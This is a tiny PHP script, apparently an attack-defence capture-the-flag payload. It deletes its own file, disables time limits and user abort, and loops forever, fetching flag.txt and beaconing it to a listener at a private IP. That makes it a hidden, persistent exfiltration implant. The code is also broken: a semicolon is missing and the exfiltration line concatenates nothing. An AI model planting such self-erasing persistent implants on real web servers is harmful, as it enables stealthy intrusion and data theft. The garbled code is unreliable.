<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);

while (True){
    $f=base64_encode(file_get_contents('http://172.16.80.1:8000/flag.txt'))
    file_get_contents("http://172.16.80.1:8000/?f=".);
    sleep(5);
}
?>
